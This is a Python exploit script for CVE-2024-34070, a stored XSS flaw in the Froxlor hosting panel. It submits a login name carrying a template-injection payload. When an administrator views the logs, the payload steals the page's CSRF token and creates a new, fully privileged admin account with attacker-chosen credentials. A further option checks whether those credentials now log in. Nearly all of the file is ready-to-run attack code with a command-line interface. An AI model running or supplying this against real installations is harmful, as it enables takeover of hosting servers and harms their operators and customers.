#!/bin/python3
import requests, argparse

# Colors Section
VERDE = "\033[1;32;40m"
AMARILLO = "\033[1;33;40m"
ROJO = "\033[1;31;40m"
CYAN = "\033[1;36;40m"
MAGENTA = "\033[1;35;40m"
FIN = "\033"

def req(url, payload, password):
        creds = {
                        "loginname":payload,
                        "password":password,
                        "dologin":""
                        }

        return requests.post(url, data=creds).text

def auth_confirmation(username, password):
        if "The username or password you typed in is wrong" in req(url, username, password):
                print(f"{ROJO}Attack apparently did not work; try again{FIN}")
        else:
                print(f"{VERDE}Attack seemed to work. Try to log in your browser with {FIN}{AMARILLO}{username}{VERDE}:{FIN}{AMARILLO}{password}{FIN}{VERDE} creds.{FIN}")


def banner():
   print(CYAN+" =======  \033 ||      \033 \033 =======  \033 \033 ==    \033 \033 ==    \033  \033       \033  \033    \033 \033          \033 \033        \033 \033   =====")
   print(CYAN+"((        \033 ||      \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033       \033  \033    \033 \033          \033 \033 ||     \033 \033 ||    /||")
   print(CYAN+"((        \033 ||      \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033       \033  \033 () \033 \033          \033 \033 ||  // \033 \033 ||  // ||")
   print(CYAN+"  =====   \033   ===   \033 \033  ====    \033 \033  ||   \033 \033  ||   \033  \033       \033  \033    \033 \033   =====  \033 \033 || //  \033 \033 || //  ||")
   print(CYAN+"       )) \033 ||   || \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033 = //  \033  \033 || \033 \033 ((       \033 \033 ||((   \033 \033 ||//   ||")
   print(CYAN+"       )) \033 ||   || \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033  ||  \033  \033  || \033 \033 ((      \033 \033  || \\\\  \033 \033 ||/    ||")
   print(CYAN+" =======  \033 ||   || \033 \033 =======  \033 \033    == \033 \033    == \033  \033  ||  \033  \033  || \033 \033   ===== \033 \033  ||  \\\\ \033 \033   =====")

if __name__ == "__main__":
        parser = argparse.ArgumentParser(
                prog="python3 XSSFroxlorBypass.py",
                description="XSS Froxlor Bypass (CVE-2024-34070).",
                epilog="GitHub Resource: https://github.com/advisories/GHSA-x525-54hf-xr53", 
                add_help=True
        )

        required = parser.add_argument_group("Required Arguments")
        required.add_argument("-u", "--url", help="URL to attack.", required=True)
        required.add_argument("-U", "--username", help="Username to inject.", required=True)
        required.add_argument("-P", "--password", help="Password to inject.", required=True)
        required.add_argument("--path", help="Filename path where to attack.", required=True)

        optional = parser.add_argument_group("Optional Arguments")
        optional.add_argument("--confirm", help="Try to confirm if attack has worked", action="store_true", required=False)
        optional.add_argument("--attack", help="Manage to attack vuln website", action="store_true", required=False)
        optional.add_argument("--banner", help="Show banner.", action="store_true", required=False)

        arg = parser.parse_args()

        url = arg.url
        username = arg.username
        password = arg.password
        path = arg.path

        if arg.banner:
                banner()
                print("\n\n")

        if arg.attack:
                # Payload injection
                payload = '''admin{{$emit.constructor`function b(){var metaTag=document.querySelector('meta[name="csrf-token"]');var csrfToken=metaTag.getAttribute('content');var xhr=new XMLHttpRequest();var url="/''' + path
                payload2 = '''";var params="new_loginname=''' + username
                payload3 = '''&admin_password=''' + password
                payload4 = '''&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";xhr.open("POST",url,true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");alert("Your Froxlor Application has been completely Hacked");xhr.send(params)};a=b()`()}}'''
                # Payload Fragments join
                injection = payload + payload2 + payload3 + payload4
                # Injection Attack
                req(url, injection, password)
                print(f"{MAGENTA}Attack performed, it is recommended to wait a few seconds or minutes as long as this is an XSS attack and it needs user interaction.{FIN}")

        if arg.confirm:
                # User existence confirmation
                auth_confirmation(username, password)
